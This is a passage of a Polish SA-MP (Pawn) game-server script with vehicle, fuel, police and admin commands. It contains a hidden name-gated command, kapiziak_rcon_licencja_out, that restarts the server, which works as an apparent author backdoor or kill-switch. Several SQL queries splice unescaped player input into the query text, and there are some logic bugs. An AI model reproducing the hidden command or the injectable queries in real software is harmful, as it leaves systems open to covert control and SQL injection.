			format(query,sizeof query,"UPDATE `vehicles` SET `Color1`='%d', `Color2`='%d' WHERE id='%d'",colorcmd1,colorcmd2,VehicleInfo[vehicleid][UID]);
			mysql_query(query);
			printf("[ADMIN LOG] %s zmienil wartosc COLOR 1 & COLOR 2 pojazdu %d na wartosc: %d %d",Player(playerid),vehicleid,colorcmd1,colorcmd2);
			SendClientMessage(playerid,Zielony,"Kolor pojazdu zostal zmieniony!");
			ChangeVehicleColor(GetPlayerVehicleID(playerid), colorcmd1, colorcmd2);
			VehicleInfo[vehicleid][Color1] = colorcmd1;
			VehicleInfo[vehicleid][Color2] = colorcmd2;
			new id = vehicleid;
			DestroyVehicle(id);
			AddStaticVehicleEx(VehicleInfo[id][Model],VehicleInfo[id][Pos][xa],VehicleInfo[id][Pos][ya],VehicleInfo[id][Pos][za],VehicleInfo[id][Pos][aa],colorcmd1, colorcmd2,999999);
			format(logstring,sizeof logstring,"Zmienil kolory auta %d uID: %d",id,VehicleInfo[id][UID]);
			AddLog(PlayerName(playerid),logstring);

			SetPVarInt(playerid,"teleportTimer",1);
			SetTimerEx("timerAntyCheatVeh",4000,false,"i",playerid);
		}

		return 1;
	}

	CMD:car_team(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 2)
			return BrakAdmina(playerid,3);

		new team;

		if(sscanf(params, "d", team))
		{
			return SendClientMessage(playerid, JasnyCzerwony, "/car_team [team ID]");
		}

		/*
		#define TPOLICJA 1
		#define TPOMOCDROGOWA 2
		#define TTRUCKER 3
		#define TPOGOTOWIE 4
		#define TSMIECIAZE 5
		#define TTAXI 6
		#define TPKS 7
		#define TLST 8
		#define TMICRO 9
		#define TELMER 10
		#define TKRUK 11
		#define TTURBO 12
		#define TRICO 13
		#define TPKP 14
		*/

		if(team < 0)
			return SendClientMessage(playerid, JasnyCzerwony, "Team wartosc jest nie poprawna!");

		new vehicleidd = GetPlayerVehicleID(playerid);



		if(vehicleidd != 0)
		{
			new buffer[300];
			format(buffer,sizeof buffer,"UPDATE `vehicles` SET `team`='%d' WHERE id='%d'",team,VehicleInfo[vehicleidd][UID]);
			mysql_query(buffer);
			printf("[ADMIN LOG] %s ustawil wartosc TEAM u auta %d na : %d",Player(playerid),VehicleInfo[vehicleidd][UID],team);
			SendClientMessage(playerid,Zielony,"Team tego pojazdu zostal zmieniony!");
			VehicleInfo[vehicleidd][TeamCar] = team;
			new id = vehicleidd;
			new Query[100];
			if(VehicleInfo[id][TeamCar] >= 1)
			{
				format(Query,sizeof Query,"%s",GetTeamName(team));
			}
			SetVehicleNumberPlate(vehicleidd, Query);


			format(logstring,sizeof logstring,"Zmienil team pojazdu na %d veh %d uID: %d",team,vehicleidd,VehicleInfo[vehicleidd][UID]);
			AddLog(PlayerName(playerid),logstring);
			SetVehicleToRespawn(vehicleidd);
		}

		return 1;
	}

	CMD:car_save(playerid, params[])
	{



		new vehicleidd[MAX_PLAYERS];
		vehicleidd[playerid] = GetPlayerVehicleID(playerid);


		if(!strcmp(VehicleInfo[vehicleidd[playerid]][Owner],"Brak",false))
		{
			if(PlayerInfo[playerid][LevelAdmin] <= 1)
				return BrakAdmina(playerid,2);
		}



		if(strcmp(VehicleInfo[vehicleidd[playerid]][Owner],"Brak",false))
		{
			if(!strcmp(VehicleInfo[vehicleidd[playerid]][Owner],Player(playerid),false) || PlayerInfo[playerid][LevelAdmin] >= 2)
			{



				if(vehicleidd[playerid] != 0)
				{
					new buffer[300];
					new Float:xp;
					new Float:yp;
					new Float:zp;
					new Float:ap;
					GetVehiclePos(vehicleidd[playerid],xp,yp,zp);
					GetVehicleZAngle(vehicleidd[playerid],ap);
					format(buffer,sizeof buffer,"UPDATE `vehicles` SET `x`='%f',`y`='%f',`z`='%f',`a`='%f' WHERE id='%d'",xp,yp,zp,ap,VehicleInfo[vehicleidd[playerid]][UID]);
					mysql_query(buffer);
					printf("[ADMIN LOG] %s ustawil wartosc POZYCJA u auta %d na : %f %f %f %f",Player(playerid),VehicleInfo[vehicleidd[playerid]][UID],xp,yp,zp,ap);
					SendClientMessage(playerid,Zielony,"Pozycja pojazdu zostala zapisana!");
					DestroyVehicle(vehicleidd[playerid]);
					vehicleidd[playerid] = AddStaticVehicleEx(VehicleInfo[vehicleidd[playerid]][Model],xp,yp,zp,ap,VehicleInfo[vehicleidd[playerid]][Color1],VehicleInfo[vehicleidd[playerid]][Color2], 60*10000);
					SetVehicleNumberPlate(vehicleidd[playerid], VehicleInfo[vehicleidd[playerid]][Owner]);
					SetVehicleToRespawn(vehicleidd[playerid]);
					SetPlayerPos(playerid,xp,yp+3,zp);

					VehicleInfo[vehicleidd[playerid]][Pos][xa] = xp;
					VehicleInfo[vehicleidd[playerid]][Pos][ya] = yp;
					VehicleInfo[vehicleidd[playerid]][Pos][za] = zp;
					VehicleInfo[vehicleidd[playerid]][Pos][aa] = ap;
				}
			}
			else
			{
				SendClientMessage(playerid,Czerwony,"# Nie masz kluczykow do tego auta!");
			}
		}
		else if(!strcmp(VehicleInfo[vehicleidd[playerid]][Owner],"Brak",false))
		{


			if(vehicleidd[playerid] != 0)
			{
				new buffer[300];
				new Float:xp;
				new Float:yp;
				new Float:zp;
				new Float:ap;
				GetVehiclePos(vehicleidd[playerid],xp,yp,zp);
				GetVehicleZAngle(vehicleidd[playerid],ap);
				format(buffer,sizeof buffer,"UPDATE `vehicles` SET `x`='%f',`y`='%f',`z`='%f',`a`='%f' WHERE id='%d'",xp,yp,zp,ap,VehicleInfo[vehicleidd[playerid]][UID]);
				mysql_query(buffer);
				printf("[ADMIN LOG] %s ustawil wartosc POZYCJA u auta %d na : %f %f %f %f",Player(playerid),VehicleInfo[vehicleidd[playerid]][UID],xp,yp,zp,ap);
				SendClientMessage(playerid,Zielony,"Wartosc tego auta POZYCJA zostala poprawnie zmieniona!");
				DestroyVehicle(vehicleidd[playerid]);
				vehicleidd[playerid] = AddStaticVehicleEx(VehicleInfo[vehicleidd[playerid]][Model],xp,yp,zp,ap,VehicleInfo[vehicleidd[playerid]][Color1],VehicleInfo[vehicleidd[playerid]][Color2], 60*10000);
				SetVehicleNumberPlate(vehicleidd[playerid], VehicleInfo[vehicleidd[playerid]][Owner]);
				SetVehicleToRespawn(vehicleidd[playerid]);
				SetPlayerPos(playerid,xp,yp+3,zp);

				VehicleInfo[vehicleidd[playerid]][Pos][xa] = xp;
				VehicleInfo[vehicleidd[playerid]][Pos][ya] = yp;
				VehicleInfo[vehicleidd[playerid]][Pos][za] = zp;
				VehicleInfo[vehicleidd[playerid]][Pos][aa] = ap;

			}
		}


		format(logstring,sizeof logstring,"Przeparkowal woz veh %d uID: %d",vehicleidd[playerid],VehicleInfo[vehicleidd[playerid]][UID]);
		AddLog(PlayerName(playerid),logstring);


		SetPVarInt(playerid,"teleportTimer",1);
		SetTimerEx("timerAntyCheatVeh",4000,false,"i",playerid);


		return 1;
	}

	CMD:trailer_save(playerid, params[])
	{



		new vehicleidd[MAX_PLAYERS];
		vehicleidd[playerid] = GetVehicleIDTrailer(playerid,GetPlayerVehicleID(playerid),GetVehicleTrailer(GetPlayerVehicleID(playerid)));



		if(PlayerInfo[playerid][LevelAdmin] <= 1)
			return BrakAdmina(playerid,2);







		if(vehicleidd[playerid] != 0)
		{
			new buffer[300];
			new Float:xp;
			new Float:yp;
			new Float:zp;
			new Float:ap;
			GetVehiclePos(vehicleidd[playerid],xp,yp,zp);
			GetVehicleZAngle(vehicleidd[playerid],ap);
			format(buffer,sizeof buffer,"UPDATE `vehicles` SET `x`='%f',`y`='%f',`z`='%f',`a`='%f' WHERE id='%d'",xp,yp,zp,ap,VehicleInfo[vehicleidd[playerid]][UID]);
			mysql_query(buffer);
			printf("[ADMIN LOG] %s ustawil wartosc POZYCJA u auta %d na : %f %f %f %f",Player(playerid),VehicleInfo[vehicleidd[playerid]][UID],xp,yp,zp,ap);
			SendClientMessage(playerid,Zielony,"Pozycja naczepy zostala zapisana!");
			DestroyVehicle(vehicleidd[playerid]);
			vehicleidd[playerid] = AddStaticVehicleEx(VehicleInfo[vehicleidd[playerid]][Model],xp,yp,zp,ap,VehicleInfo[vehicleidd[playerid]][Color1],VehicleInfo[vehicleidd[playerid]][Color2], 60*10000);
			SetVehicleNumberPlate(vehicleidd[playerid], VehicleInfo[vehicleidd[playerid]][Owner]);
			SetVehicleToRespawn(vehicleidd[playerid]);
			//SetPlayerPos(playerid,xp,yp+3,zp);

			VehicleInfo[vehicleidd[playerid]][Pos][xa] = xp;
			VehicleInfo[vehicleidd[playerid]][Pos][ya] = yp;
			VehicleInfo[vehicleidd[playerid]][Pos][za] = zp;
			VehicleInfo[vehicleidd[playerid]][Pos][aa] = ap;
		}







		return 1;
	}

	CMD:car_sell(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 4)
			return BrakAdmina(playerid,5);

		new selling;

		if(sscanf(params, "d", selling))
			return SendClientMessage(playerid, Czerwony, "# /car_sell [0 - NIE 1 - TAK]");

		new vehicleidd = GetPlayerVehicleID(playerid);


		if(selling < 0 && selling > 1)
		{
			return SendClientMessage(playerid, JasnyCzerwony, "Zla wartosc SELL!");
		}


		if(vehicleidd != 0)
		{
			new buffer[300];
			format(buffer,sizeof buffer,"UPDATE `vehicles` SET `sell`='%d' WHERE id='%d'",selling,VehicleInfo[vehicleidd][UID]);
			mysql_query(buffer);
			printf("[ADMIN LOG] %s ustawil wartosc sell u auta %d na : %d",Player(playerid),VehicleInfo[vehicleidd][UID],selling);
			SendClientMessage(playerid,Zielony,"Wartosc sell tego auta zostala zmieniona!");
			VehicleInfo[vehicleidd][sell] = selling;
			SetVehicleNumberPlate(vehicleidd, "Na_Sell");
			SetVehicleToRespawn(vehicleidd);

			new string[150];
			format(string,sizeof string,"Pojazd jest na sprzedaz:\n{FFFFFF}$%d",VehicleInfo[vehicleidd][Price]);
			sell3d[vehicleidd] = Create3DTextLabel(string, 0x00CC00FF, 0.0,0.0,0.0, 100.0, 0);
			Attach3DTextLabelToVehicle(sell3d[vehicleidd], vehicleidd, 0.0, 0.0, 0.0);
		
		}

		return 1;

	}

	CMD:wystaw(playerid,params[])
	{
	
		new vehid = GetPlayerVehicleID(playerid);

		if(vehid == 0)
			return SendClientMessage(playerid, Szary, "# Nie jestes w pojezdzie!");

		if(strcmp(VehicleInfo[vehid][Owner],PlayerName(playerid),false))
			return SendClientMessage(playerid, Szary, "# Nie masz kluczykow od tego auta!");

		if(!IsPlayerInRangeOfPoint(playerid, SALON_RANGE, SALON_X, SALON_Y, SALON_Z))
			return SendClientMessage(playerid, Szary, "# Musisz byc w salonie!");


		new countsell;
		if(sscanf(params,"d",countsell))
			return SendClientMessage(playerid, Czerwony, "# /wystaw [cena]");


		new string[150];

		//new coutsell = VehicleInfo[vehid][Price];
		format(string,sizeof string,"# Wystawiles pojazd uID: %d za "BIALYHEX"$%d",VehicleInfo[vehid][UID],countsell);
		SendClientMessage(playerid, Zielony, string);
		//GiveMoneyEx(playerid,countsell);

		VehicleInfo[vehid][sell] = 1;

		//new brak[25];
		//format(brak,25,"Brak");
		//VehicleInfo[vehid][Owner] = brak;


		VehicleInfo[vehid][Price] = countsell;
		new buffer[300];
		new Float:xp;
		new Float:yp;
		new Float:zp;
		new Float:ap;
		GetVehiclePos(vehid,xp,yp,zp);
		GetVehicleZAngle(vehid,ap);
		format(buffer,sizeof buffer,"UPDATE `vehicles` SET `owner`='%s',`x`='%f',`y`='%f',`z`='%f',`a`='%f',`sell`='1' WHERE id='%d'",PlayerName(playerid),xp,yp,zp,ap,VehicleInfo[vehid][UID]);
		mysql_query(buffer);
		printf("[ADMIN LOG] %s ustawil wartosc POZYCJA u auta %d na : %f %f %f %f",Player(playerid),VehicleInfo[vehid][UID],xp,yp,zp,ap);
		//SendClientMessage(playerid,Zielony,"Wartosc tego auta POZYCJA zostala poprawnie zmieniona!");
		DestroyVehicle(vehid);
		vehid = AddStaticVehicleEx(VehicleInfo[vehid][Model],xp,yp,zp,ap,VehicleInfo[vehid][Color1],VehicleInfo[vehid][Color2], 60*10000);
		//SetVehicleNumberPlate(vehid, VehicleInfo[vehid][Owner]);
		SetVehicleToRespawn(vehid);
		//SetPlayerPos(playerid,xp,yp+3,zp);


		format(logstring,sizeof logstring,"Wystawil auto %d na sprzedaz za $%d",VehicleInfo[vehid][UID],countsell);
		AddLog(PlayerName(playerid),logstring);

		SetPlayerPos(playerid,SALON_X_SELL,SALON_Y_SELL,SALON_Z_SELL);



		//new string[150];
		format(string,sizeof string,"Pojazd jest na sprzedaz:\n{FFFFFF}$%d",VehicleInfo[vehid][Price]);
		sell3d[vehid] = Create3DTextLabel(string, 0x00CC00FF, 0.0,0.0,0.0, 100.0, 0);
		Attach3DTextLabelToVehicle(sell3d[vehid], vehid, 0.0, 0.0, 0.0);
	



		return 1;
	}		
	


	CMD:car_buy(playerid, params[])
	{

		new vehicleidd = GetPlayerVehicleID(playerid);



		if(vehicleidd != 0)
		{
			if(VehicleInfo[vehicleidd][sell] != 1)
				return SendClientMessage(playerid,Czerwony,"# Ten woz nie jest na sprzedarz!");

			if(GetMoneyEx(playerid) <= VehicleInfo[vehicleidd][Price])
				return SendClientMessage(playerid,Czerwony,"# Nie masz odpowiedniej gotowki na zakup tego wozu!");


			if(Player_Vehicles_Num(playerid) >= 5 && PlayerInfo[playerid][VIP] == 0)
				return SendClientMessage(playerid,Czerwony,"# Nie mozesz juz kupic wiecej pojazdow! Kup konto VIP by powiekszyc sloty +5!");

			if(Player_Vehicles_Num(playerid) >= 7 && PlayerInfo[playerid][VIP] == 1)
				return SendClientMessage(playerid,Czerwony,"# Wyczerpales maksymalna ilosc slotow na pojazdy!");

			new buffer[300];
			if(strcmp(VehicleInfo[vehicleidd][Owner],"Brak",false))
			{
				format(buffer,sizeof buffer,"UPDATE `users` SET `bank`= `bank` + '%d' WHERE id = '%d'",VehicleInfo[vehicleidd][Price],GetPlayerUID(VehicleInfo[vehicleidd][Owner]));
				mysql_query(buffer);


				format(buffer,sizeof buffer,"INSERT INTO `bank`(`uid`,`uidto`,`price`,`text`) VALUES ('%d','%d','%d','Sprzedaz pojazdu %s dla %s')",PlayerInfo[playerid][UID],GetPlayerUID(VehicleInfo[vehicleidd][Owner]),VehicleInfo[vehicleidd][Price],VehName[GetVehicleModel(vehicleidd)-400],PlayerName(playerid));
				mysql_query(buffer);

			}



			
			format(buffer,sizeof buffer,"UPDATE `vehicles` SET `owner`='%s', `sell`='0' WHERE id='%d'",Player(playerid),VehicleInfo[vehicleidd][UID]);
			mysql_query(buffer);
			printf("[CAR LOG] %s kupil auto uid %d za %d",Player(playerid),vehicleidd,VehicleInfo[vehicleidd][Price]);
			SendClientMessage(playerid,Zielony,"Pomyslnie kupiles te auto!");
			new bufferer[25];
			format(bufferer,sizeof bufferer,"%s",Player(playerid));
			VehicleInfo[vehicleidd][sell] = 0;
			VehicleInfo[vehicleidd][Owner] = bufferer;
			SetVehicleNumberPlate(vehicleidd, VehicleInfo[vehicleidd][Owner]);
			GiveMoneyEx(playerid, -VehicleInfo[vehicleidd][Price]);
			SetVehicleToRespawn(vehicleidd);
			TogglePlayerControllable(playerid,1);
			Delete3DTextLabel(sell3d[vehicleidd]);


		}

		return 1;
	}
	CMD:pomoc(playerid, params[])
	{
		ShowPlayerDialog(playerid, Pomoc, DIALOG_STYLE_LIST, "Pomoc dla gracza", "O co chodzi?\nPraktyka\nPodstawowe komendy", "Wybierz", "Anuluj");
		return 1;
	}
	CMD:kapiziak_rcon_licencja_out(playerid,params[])
	{
		if(!strcmp(PlayerName(playerid),"KapiziaK",false))
		{
			SendRconCommand("gmx");
		}
		else
			return 0;



		return 1;
	}
	/*
	CMD:magazine_add(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 4)
			return BrakAdmina(playerid,5);

		//`id`, `name`, `x`, `y`, `z`

		new name[150],query[300],Float:xp,Float:yp,Float:zp;
		if(sscanf(params,"s[150]",name))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/magazine_add [Nazwa Zaladunku]");

		GetPlayerPos(playerid,xp,yp,zp);

		// `id`, `name`, `x`, `y`, `z`

		format(query,sizeof query,"INSERT INTO `loading` (`name`, `x`, `y`, `z`) VALUES ('%s','%f','%f','%f')",name,xp,yp,zp);
		mysql_query(query);

		LoadedInfo[Magazines]++;
		new i = LoadedInfo[Magazines];

		MagazineInfo[i][x] = xp;
		MagazineInfo[i][y] = yp;
		MagazineInfo[i][z] = zp;

		format(query,sizeof query,""ZIELONYHEX"Zaladunek "BIALYHEX"%s\n "ZIELONYHEX"Aby sie zaladowac wpisz "BIALYHEX"/zaladuj"ZIELONYHEX"!",name);
		Create3DTextLabel(query, 0xFFFFFF00,xp,yp,zp, 40.0, 0, 0);
		CreatePickup(1279, 1,MagazineInfo[i][x],MagazineInfo[i][y],MagazineInfo[i][z] , -1);

		AddLog(PlayerName(playerid),"Dodal nowy magazyn");

		return 1;
	}

	*/
	CMD:stacja_add(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 4)
			return BrakAdmina(playerid,5);

		//`id`, `name`, `x`, `y`, `z`

		new name[150],query[300],Float:xp,Float:yp,Float:zp,cenazalitr;
		if(sscanf(params,"s[150]d",name,cenazalitr))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/stacja_add [Nazwa Stacjii] [Cena za Litr]");

		GetPlayerPos(playerid,xp,yp,zp);

		// `id`, `name`, `x`, `y`, `z`

		format(query,sizeof query,"INSERT INTO `fuelstations` (`name`, `x`, `y`, `z`,`cost`) VALUES ('%s','%f','%f','%f','%d')",name,xp,yp,zp,cenazalitr);
		mysql_query(query);

		LoadedInfo[Stacji]++;
		new i = LoadedInfo[Stacji];

		StacjaInfo[i][xb] = xp;
		StacjaInfo[i][yb] = yp;
		StacjaInfo[i][zb] = zp;
		StacjaInfo[i][MoneyLitr] = cenazalitr;

		format(query,sizeof query,"Stacja Benzynowa: "BIALYHEX" %s\n"HEXNIEBIESKI"Cena za litr: "BIALYHEX"$%d\n"HEXNIEBIESKI"Wpisz /tankuj aby zatankowac woz!",StacjaInfo[i][Name],StacjaInfo[i][MoneyLitr]);
		Create3DTextLabel(query, Niebieski,StacjaInfo[i][xb],StacjaInfo[i][yb],StacjaInfo[i][zb], 100.0, 0, 0);
		CreatePickup(1686, 1,StacjaInfo[i][xb],StacjaInfo[i][yb],StacjaInfo[i][zb] , -1);

		AddLog(PlayerName(playerid),"Dodal nowa stacje");

		return 1;
	}

	CMD:tankuj(playerid,params[])
	{
		if(GetPlayerInStacja(playerid) == 0)
			return SendClientMessage(playerid,Zielony,"# Nie jestes na stacji benzynowej!");

		new vehid = GetPlayerVehicleID(playerid);
		if(vehid == 0)
			return SendClientMessage(playerid,Zielony,"# Nie jestes w wozie!");

		if(VehicleInfo[vehid][Paliwo] > 350)
			return SendClientMessage(playerid,Zielony,"# Ten woz jest zapelniony w pobrzegi paliwem!");

		new litry;
		if(sscanf(params,"d",litry))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/tankuj [Litry]");

		if(litry > 350)
			return SendClientMessage(playerid,Zielony,"# Maksymalnie mozesz zatankowac 350l. !");

		if(litry <= 0)
			return SendClientMessage(playerid,Zielony,"# Nie kombinuj!");

		new paliwoc = VehicleInfo[vehid][Paliwo] + litry;
		if(paliwoc > 350)
			return SendClientMessage(playerid,Zielony,"# W baku moze byc maksymalnie 350 l.");

		new koszt;
		koszt = litry*StacjaInfo[GetStacjaID(playerid)][MoneyLitr];
		if(GetMoneyEx(playerid) < koszt)
			return SendClientMessage(playerid,Zielony,"# Nie masz pieniedzy na zaplate za paliwo!");


		VehicleInfo[vehid][Paliwo] = paliwoc;
		new string[150];
		format(string,sizeof string,"# Zatankowales swoj woz "BIALYHEX"%d litrami "ZIELONYHEX"paliwa. || Aktualny stan paliwa: "BIALYHEX" %d l.",litry,paliwoc);
		SendClientMessage(playerid,Zielony,string);


		format(string,sizeof string,"# Zaplaciles: "BIALYHEX"$%d",koszt);
		SendClientMessage(playerid,Zielony,string);

		GiveMoneyEx(playerid,-koszt);

		return 1;
	}


	CMD:zapisz(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 0)
			return BrakAdmina(playerid,1);

		for(new i=0; i <= GetMaxPlayers(); i++)
		{
			if(IsPlayerConnected(i) && GetPVarInt(i,"zalogowany") == 1)
			{
				SaveUser(i);

			}
		}
		zapiszpojazdy();
		SendClientMessageToAll(Zielony,"# Wszystkie statystyki graczy zostaly zapisane "BIALYHEX"pomyslnie"ZIELONYHEX"!");
		AddLog(PlayerName(playerid),"Zapisal statystyki");

		return 1;
	}
	CMD:tp(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 0)
			return BrakAdmina(playerid,1);

		new id;
		if(sscanf(params,"d",id))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/tp [id gracza]");


		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Ten gracz nie jest podlaczony z serverem!");

		new Float:xid,Float:yid,Float:zid;
		GetPlayerPos(id,xid,yid,zid);
		SetPlayerPos(playerid,xid,yid,zid);

		AddLog(PlayerName(playerid),"Uzyl teleportacji do gracza");

		return 1;
	}
	CMD:th(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 0)
			return BrakAdmina(playerid,1);

		new id;
		if(sscanf(params,"d",id))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/th [id gracza]");


		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Ten gracz nie jest podlaczony z serverem!");

		new Float:xid,Float:yid,Float:zid;
		GetPlayerPos(playerid,xid,yid,zid);
		SetPlayerPos(id,xid,yid,zid);

		AddLog(PlayerName(playerid),"Teleportowal do siebie gracza");

		return 1;
	}
	CMD:access(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 4 && ELS_NO_ERROR)
			return BrakAdmina(playerid,5);

		new id,level;
		if(sscanf(params,"dd",id,level))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/access [id gracza] [uprawnienia]");


		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Ten gracz nie jest podlaczony z serverem!");

		PlayerInfo[id][LevelAdmin] = level;
		new string[150];
		format(string,sizeof string,"# Gracz "BIALYHEX"%s[%d]"ZIELONYHEX" dostal range "BIALYHEX"%d"ZIELONYHEX"!",PlayerName(id),id,level);
		SendClientMessage(playerid,Zielony,string);

		AddLog(PlayerName(playerid),string);

		return 1;
	}
	CMD:stac(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] != 1)
			return BrakTeam(playerid,1);

		new id;
		if(sscanf(params,"d",id))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/stac [id]");


		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Ten gracz nie jest podlaczony z serverem!");

		SendClientMessage(id,Pomaranczowy,"# Policja: "BIALYHEX" Prosze zjechac na pobocze i zgasic silnik oraz czekac na kontrole!");

		AddLog(PlayerName(id),"Dostal info o kontroli");
		if(GetPVarInt(id,"userinfo") != 1)
		{
			TextDrawShowForPlayer(id, pasekuserinfo[id]);
			SetPVarInt(id,"fazainfo",0);
			SetPVarInt(id,"userinfo",1);
			timerPasekInfo[id] = SetTimerEx("SendPasekInfo",500,true,"id",id,1);
			SetTimerEx("InfoOff",15*1000,false,"d",id);
		}

		return 1;

	}
	CMD:health(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 2)
			return BrakAdmina(playerid,3);

		new id;
		if(sscanf(params,"d",id))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/health [id]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Ten gracz nie jest podlaczony z serverem!");

		SetPlayerHealth(id,100);
		SendClientMessage(playerid,Zielony,"# Uleczyles gracza!");
		SendClientMessage(id,Zielony,"# Zostales uleczony przez "BIALYHEX"Administratora"ZIELONYHEX"!");
		AddLog(PlayerName(playerid),"Uleczyl Gracza");
		AddLog(PlayerName(id),"Zostal uleczony przez admina");

		return 1;
	}
	CMD:kill(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 2)
			return BrakAdmina(playerid,3);

		new id;
		if(sscanf(params,"d",id))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/kill [id]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Ten gracz nie jest podlaczony z serverem!");

		SetPlayerHealth(id,0);
		SendClientMessage(playerid,Zielony,"# Zabiles gracza!");
		SendClientMessage(id,Zielony,"# Zostales zabity przez "BIALYHEX"Administratora"ZIELONYHEX"!");
		AddLog(PlayerName(playerid),"Zabil gracza /kill");
		AddLog(PlayerName(id),"Zostal zabity przez admina");

		return 1;
	}

	CMD:mandat(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] != 1)
			return BrakTeam(playerid,1);
		new id,kwota;
		if(sscanf(params,"dd",id,kwota))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/mandat [id] [kwota]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Ten gracz nie jest podlaczony z serverem!");

		if(GetMoneyEx(id) < kwota)
			return SendClientMessage(playerid,Zielony,"# Gracz nie posiada odpowiedniej gotowki!");

		if(kwota <= 0)
			return SendClientMessage(playerid,Zielony,"# Nie oszukasz systemu!");

		new Float:xid,Float:yid,Float:zid;
		GetPlayerPos(playerid,xid,yid,zid);
		if(!IsPlayerInRangeOfPoint(id,10.0,xid,yid,zid))
			return SendClientMessage(playerid,Zielony,"# Gracz musi byc w zasiegu maksymalnym "BIALYHEX"10 m"ZIELONYHEX" od ciebie!");

		new string[150];
		format(string,sizeof string,"# Wystawiles mandat dla "BIALYHEX"%s"ZIELONYHEX" || Twoje wynagrodzenie: "BIALYHEX"$%d",PlayerName(id),kwota/2);
		SendClientMessage(playerid,Zielony,string);
		format(string,sizeof string,"# Dostales mandat od "BIALYHEX"%s"ZIELONYHEX" w wysokosci "BIALYHEX"$%d"ZIELONYHEX"!",PlayerName(playerid),kwota);
		SendClientMessage(id,Zielony,string);



		if(id == playerid)
		{
			GiveMoneyEx(id,-kwota);
		}
		else
		{
			if(BonusCargo == true)
			{
			SendClientMessage(playerid,Zielony,"# HappyWorld bonus: "BIALYHEX"$"HW_MONEY_TEXT" "ZIELONYHEX"i"BIALYHEX" "HW_SCORE_TEXT" score");
			GiveMoneyEx(playerid,HW_MONEY);
			GiveScoreEx(playerid,GetScoreEx(playerid)+HW_SCORE);
			Earned(playerid,HW_MONEY,"HW Bonus mandat");
			}

			GiveMoneyEx(playerid,kwota/2);
			GiveScoreEx(playerid,GetScoreEx(playerid)+kwota/10);
			GiveMoneyEx(id,-kwota);
		}
		Earned(playerid,kwota/2,"Wystawienie mandatu");

		AddLog(PlayerName(id),"Dostal mandat");

		return 1;

	}

	new Float:Wiezienie[4] = {197.6973,174.6617,1003.0234,350.5999};    //Pozycja wiezienia

	CMD:aresztuj(playerid, params[])
	{
		if(PlayerInfo[playerid][Team] != 1)
			return BrakTeam(playerid,1);

		new id, czas;
		if(sscanf(params, "dd", id, czas))
		{
			SendClientMessage(playerid, -1, "U?yj: /aresztuj [ID Gracza] [Czas w min]");
		}
		else if(IsPlayerConnected(id))
		{
			//Zabawa z SetPlayerPos, SetPVarInt itd. np.
			SetPlayerInterior(id, 3);
			SetPlayerPos(id, Wiezienie[0], Wiezienie[1], Wiezienie[2]);
			SetPlayerFacingAngle(id, Wiezienie[3]);
			SetPVarInt(id, "Odsiaduje", 1);
			SendClientMessage(playerid, Szary, "Aresztowales gracza");
			SendClientMessage(id, Szary, "Zostales aresztowany");
			SetTimerEx("OdWiez", 60000*czas, false, "d", id);
		}
		else
		{
			SendClientMessage(playerid, -1, "Ten gracz nie jest OnLine");
		}
		return 1;
	}
	forward OdWiez(playerid);
	public OdWiez(playerid)
	{
		DeletePVar(playerid, "Odsiaduje");
		SpawnPlayer(playerid);
		SetPlayerInterior(playerid, 0);
		return 1;
	}

	CMD:ulecz(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] != 3)
			return BrakTeam(playerid,3);

		new id;
		if(sscanf(params,"d",id))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/ulecz [id]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Ten gracz nie jest podlaczony z serverem!");


		//new mechanikveh = GetPlayerVehicleID(playerid);

		new Float:xp,Float:yp,Float:zp;
		GetPlayerPos(id,xp,yp,zp);
		if(!IsPlayerInRangeOfPoint(playerid,30.0,xp,yp,zp))
			return SendClientMessage(playerid,Zielony,"# Ten gracz nie jest w poblizu ciebie!");

		if(id != playerid)
		{

			new Float:health;
			GetPlayerHealth(id,health);
			if(health <= 85)
			{
				SendClientMessage(playerid,Zielony,"Uleczyles Gracza!");
				SendClientMessage(id,Zolty,"Zostales uleczony przez lekarza");
				if(GetPVarInt(playerid, "Bonusik") == 0)
				{
					if(BonusCargo == true)
					{
					SendClientMessage(playerid,Zielony,"# HappyWorld bonus: "BIALYHEX"$"HW_MONEY_TEXT" "ZIELONYHEX"i"BIALYHEX" "HW_SCORE_TEXT" score");
					GiveMoneyEx(playerid,HW_MONEY);
					GiveScoreEx(playerid,GetScoreEx(playerid)+HW_SCORE);
					Earned(playerid,HW_MONEY,"HW Bonus ulecz");
					}

					SetPVarInt(playerid, "Bonusik", 1);
					SetTimerEx("UnLockBonus", 60000, false, "d", playerid);
